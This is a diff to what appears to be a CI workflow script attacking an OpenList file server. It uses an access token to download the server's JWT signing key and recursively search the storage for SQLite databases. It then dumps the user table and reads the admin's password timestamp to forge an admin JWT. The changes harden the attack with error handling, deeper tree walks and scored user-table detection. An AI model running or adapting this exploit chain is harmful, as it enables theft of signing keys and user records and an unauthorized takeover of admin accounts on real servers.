@@ -14,7 +14,7 @@ jobs:
           SUB=$(curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d '{"path":"/"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['data']['content'][0]['name'])")
           echo "SUB=[$SUB]"
           export TOKEN SUB
-          get_raw () { curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"$1\"}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('raw_url',''))"; }
+          get_raw () { curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"$1\"}" | python3 -c "import sys,json;d=json.load(sys.stdin);print((d.get('data') or {}).get('raw_url','')) if d else ''" 2>/dev/null; }
           dl () { curl -skS -m120 "$1" -o "$2" -w "  dl $2 -> HTTP %{http_code} bytes=%{size_download}\n"; }
           U=$(get_raw "/$SUB/jwt.key"); dl "$U" /tmp/jwt.key
           echo "jwt.key ascii=[$(cat /tmp/jwt.key 2>/dev/null)]  sha256=$(sha256sum /tmp/jwt.key 2>/dev/null | cut -c1-32)"
@@ -24,30 +24,41 @@ jobs:
           ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
           def reqjson(path,payload):
               r=urllib.request.Request(B+path,data=json.dumps(payload).encode(),headers={"Authorization":T,"Content-Type":"application/json"},method="POST")
-              return json.loads(urllib.request.urlopen(r,context=ctx,timeout=30).read())
+              try: return json.loads(urllib.request.urlopen(r,context=ctx,timeout=30).read())
+              except Exception: return None
           def listp(path,page): return reqjson("/api/fs/list",{"path":path,"page":page,"per_page":100})
-          def get_raw(path): return reqjson("/api/fs/get",{"path":path}).get('data',{}).get('raw_url','')
+          def get_raw(path):
+              d=reqjson("/api/fs/get",{"path":path})
+              if not d: return ''
+              return (d.get('data') or {}).get('raw_url','')
           def dl(url,out):
               data=urllib.request.urlopen(url,context=ctx,timeout=120).read()
               open(out,'wb').write(data); return len(data)
-          # 1) recursive tree walk, flag any *.db/*.sqlite
+          # 1) recursive tree walk, flag any *.db/*.sqlite (OpenList type is int: 1=folder,0=file)
           cands=[]
+          depth_hits=0
           def walk(path,depth=0):
+              global depth_hits
               page=1
               while True:
-                  d=listp(path,page); content=d.get('data',{}).get('content',[])
+                  d=listp(path,page)
+                  if not d: break
+                  content=d.get('data',{}).get('content',[])
                   if not content: break
                   for x in content:
                       nm=x.get('name',''); tp=x.get('type'); sz=x.get('size')
                       full=(path if path=='/' else path.rstrip('/')+'/')+nm
+                      is_folder = (tp==1 or tp=='folder' or tp=='dir')
                       print('  '*depth+full+' ['+str(tp)+'] sz='+str(sz))
-                      if tp=='folder' and depth<4: walk(full,depth+1)
-                      elif nm.endswith('.db') or nm.endswith('.sqlite') or nm.endswith('.sqlite3'):
+                      if is_folder and depth<5:
+                          depth_hits+=1; walk(full,depth+1)
+                      elif (nm.endswith('.db') or nm.endswith('.sqlite') or nm.endswith('.sqlite3')):
                           cands.append(full); print('    *** DB CANDIDATE: '+full)
                   if len(content)<100: break
                   page+=1
-                  if page>100: break
+                  if page>200: break
           walk('/')
+          print("SUBTREE_FOLDER_VISITS "+str(depth_hits))
           # 2) explicit OpenList default data-DB locations
           for e in ["/data/data.db","/data.db","/OpenList.db","/data/OpenList.db","/data/data.sqlite","/data.db.sqlite"]:
               full="/"+SUB+e
@@ -72,20 +83,25 @@ jobs:
                   for t in tabs:
                       cols=[d[1] for d in con.execute('PRAGMA table_info(%s)'%t)]
                       print("  SCHEMA "+t+" "+str(cols))
-                  ut=None
+                  # pick user table by score: pwd_ts(strongest) + password + username + role/perm
+                  ut=None; best=-1
                   for t in tabs:
                       cols=[d[1].lower() for d in con.execute('PRAGMA table_info(%s)'%t)]
-                      if any('user' in x for x in cols) and any(any(k in x for k in ('pass','pwd','hash','perm','role','ban','auth')) for x in cols):
-                          ut=t; break
-                  if ut:
+                      sc=0
+                      if 'pwd_ts' in cols: sc+=4
+                      if any(k in x for k in ('password','pass','pwd','hash') for x in cols): sc+=2
+                      if any('user' in x or x in ('name','username','uname') for x in cols): sc+=1
+                      if any(x in ('role','permission','perm','is_admin','disabled') for x in cols): sc+=1
+                      if sc>best: best=sc; ut=t
+                  if ut and best>=3:
                       cols=[d[1] for d in con.execute('PRAGMA table_info(%s)'%ut)]
                       rows=list(con.execute('select * from %s'%ut))
-                      print("  USERTAB "+ut+" ROWS "+str(len(rows)))
+                      print("  CHOSEN_UT "+ut+" (score "+str(best)+") ROWS "+str(len(rows)))
                       lc=[x.lower() for x in cols]
                       uidx=next((i for i,x in enumerate(lc) if x in ('username','user','uname','name')),0)
                       for r in rows:
                           d=dict(zip(cols,r))
-                          mask={k:(v if k.lower() not in ('password','pass','pwd','hash','password_hash') else '***') for k,v in d.items()}
+                          mask={k:(v if k.lower() not in ('password','pass','pwd','hash','password_hash','otp_secret') else '***') for k,v in d.items()}
                           print("    UROW "+str(mask))
                           u=str(d.get(cols[uidx]) or '').lower()
                           if u=='admin':
@@ -101,6 +117,9 @@ jobs:
                               open('/tmp/admin_pwdts.txt','w').write(str(pts))
                               found=True
                               print("  FORGED admin JWT with pwd_ts="+str(pts))
+                              break
+                  else:
+                      print("  NO_USER_TABLE_IN "+c)
               except Exception as ex: print("  NOT_SQLITE_OR_ERR "+repr(ex))
           print("FOUND_USER_DB "+str(found))
           print("DBPROBE_DONE")
